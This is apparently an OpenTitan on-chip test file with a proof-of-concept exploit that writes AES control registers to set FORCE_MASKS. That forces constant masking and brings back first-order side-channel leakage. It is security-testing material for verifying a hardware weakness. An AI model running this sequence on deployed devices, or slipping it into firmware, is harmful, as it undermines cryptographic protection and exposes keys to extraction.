#include <stdint.h>
#include <stdbool.h>

#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"

#include "aes_regs.h"  // Auto-generated register offsets and bitfield names.
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"

OTTF_DEFINE_TEST_CONFIG();

// Proof-of-concept that the AES core was instantiated with
// SecAllowForcingMasks hard-wired to 1 in the RTL. This allows software to
// set the CTRL_AUX.SHADOWED.FORCE_MASKS bit at runtime and thereby force the
// internal masking PRNG to constant masks (re-introducing first-order leakage).

bool test_main(void) {
  LOG_INFO("AES FORCE_MASKS POC: starting");

  // Create an MMIO region for the AES device using the auto-generated base
  // address constant. We use the base library mmio API for direct register
  // access as required by the POC development guidelines.
  mmio_region_t aes = mmio_region_from_addr(TOP_EARLGREY_AES_BASE_ADDR);

  // Read current AUX shadowed register.
  uint32_t aux_shadow = mmio_region_read32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET);
  bool before_force = bitfield_bit32_read(aux_shadow, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT);
  LOG_INFO("Initial AES CTRL_AUX_SHADOWED.FORCE_MASKS = %d", before_force);

  // Step 1: Unlock AUX shadowed register for write by setting REGWEN = 1.
  // In normal secure configurations writes may be prohibited. We explicitly
  // attempt to enable writes (the DIF does this as well). Using direct MMIO
  // ensures we control the sequence precisely.
  LOG_INFO("Enabling AUX register write (REGWEN = 1)");
  mmio_region_write32(aes, AES_CTRL_AUX_REGWEN_REG_OFFSET, 1u);

  // Step 2: Set FORCE_MASKS = 1 in the AUX shadowed register. Shadowed
  // registers must be written twice (shadowed write). We perform two writes
  // to emulate the expected software behaviour.
  uint32_t new_aux = bitfield_bit32_write(aux_shadow, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT, true);
  LOG_INFO("Writing AES CTRL_AUX_SHADOWED with FORCE_MASKS=1 (shadowed write)");
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, new_aux);
  mmio_region_write32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET, new_aux);

  // Step 3: Optionally lock the AUX register by clearing REGWEN to 0, to
  // emulate the behaviour of legitimate software that locks configuration.
  LOG_INFO("Locking AUX register (REGWEN = 0)");
  mmio_region_write32(aes, AES_CTRL_AUX_REGWEN_REG_OFFSET, 0u);

  // Step 4: Read back the AUX shadowed register and verify the FORCE_MASKS
  // bit is set. If the RTL had the secure default and the CSR path disabled,
  // this write would either be ignored or the field would not exist. The
  // presence and persistence of the bit shows software control is possible.
  uint32_t aux_shadow_after = mmio_region_read32(aes, AES_CTRL_AUX_SHADOWED_REG_OFFSET);
  bool after_force = bitfield_bit32_read(aux_shadow_after, AES_CTRL_AUX_SHADOWED_FORCE_MASKS_BIT);
  LOG_INFO("After exploit: AES CTRL_AUX_SHADOWED.FORCE_MASKS = %d", after_force);

  // Check that the FORCE_MASKS bit is set. This demonstrates that software
  // can enable constant masks at runtime via the CSR, which—when combined
  // with the hard-wired SecAllowForcingMasks=1—reintroduces first-order
  // side-channel leakage.
  CHECK(after_force == true, "Failed to set FORCE_MASKS: AES appears not to expose the CSR path");

  LOG_INFO("SUCCESS: FORCE_MASKS was set via CSR path. Masking can be forced to constants at runtime.");
  return true;
}